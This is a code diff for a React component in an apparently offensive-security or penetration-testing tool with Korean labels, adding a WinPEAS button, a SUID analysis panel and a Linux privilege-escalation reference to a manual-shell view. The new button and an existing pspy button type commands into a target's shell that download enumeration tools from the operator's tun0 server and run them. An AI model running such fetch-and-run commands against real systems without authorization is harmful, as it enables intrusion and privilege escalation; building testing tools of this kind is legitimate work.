@@ -5,6 +5,8 @@ import { DetachableTerminal } from "../../FloatingTerminal";
 import SmartTerminalOutput from "../../SmartTerminalOutput";
 import InteractiveTerminal from "../../InteractiveTerminal";
 import LinpeasAnalysisPanel from "../../LinpeasAnalysisPanel";
+import SuidAnalysisPanel from "../../SuidAnalysisPanel";
+import LinuxPrivescReference from "../../LinuxPrivescReference";
 import XtermOutput from "../../XtermOutput";
 import { parseLinkExtractResults, parseMysqlProbeSuccess } from "../../serviceIntel";
 import { buildFileTree, FileTreeView, parseTaggedTreeLines } from "../../fileTree";
@@ -1224,7 +1226,7 @@ export function Inspector(props: {
       {sessionId !== null && isManualShell && <section className="privescServer"
         aria-labelledby="graph-privesc-server-heading">
         <header>
-          <h2 id="graph-privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/pspy)</h2>
+          <h2 id="graph-privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/WinPEAS/pspy)</h2>
           <small>{privescServer?.running
             ? `tun0에서 서비스 중 · ${privescServer.base_url}`
             : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
@@ -1249,6 +1251,13 @@ export function Inspector(props: {
             LinPEAS 명령 셸에 입력
           </button>
           <button type="button" disabled={!manualShellOpen || !privescServer?.running
+            || !(privescServer?.available?.peass ?? true)}
+            onClick={() => sendToManualShell(
+              `curl.exe -o winpeas.exe ${privescServer?.base_url}` +
+              `/peass/winpeas/winPEASany.exe && .\\winpeas.exe`)}>
+            WinPEAS 명령 셸에 입력
+          </button>
+          <button type="button" disabled={!manualShellOpen || !privescServer?.running
             || !(privescServer?.available?.pspy ?? true)}
             onClick={() => sendToManualShell(
               `curl -sS ${privescServer?.base_url}/pspy/pspy64 -o /tmp/pspy64 ` +
@@ -1263,6 +1272,12 @@ export function Inspector(props: {
         onClose={() => setManualShellOpen(false)} />}
       {sessionId !== null && isManualShell && <LinpeasAnalysisPanel
         targetId={props.executionContext?.targetId} projectId={props.projectId} />}
+      {sessionId !== null && isManualShell && <SuidAnalysisPanel
+        targetId={props.executionContext?.targetId} projectId={props.projectId} />}
+      {sessionId !== null && isManualShell && <details className="sqlPayloadCategory">
+        <summary><b>Linux PrivEsc 참고 열기</b></summary>
+        <LinuxPrivescReference onSendCommand={manualShellOpen ? sendToManualShell : undefined} />
+      </details>}
       {executionId !== null && <DetachableTerminal id={`graph-execution-${executionId}`}
         label={`${n.label} 실행 결과`}
         commandContext={target && props.executionContext ? {
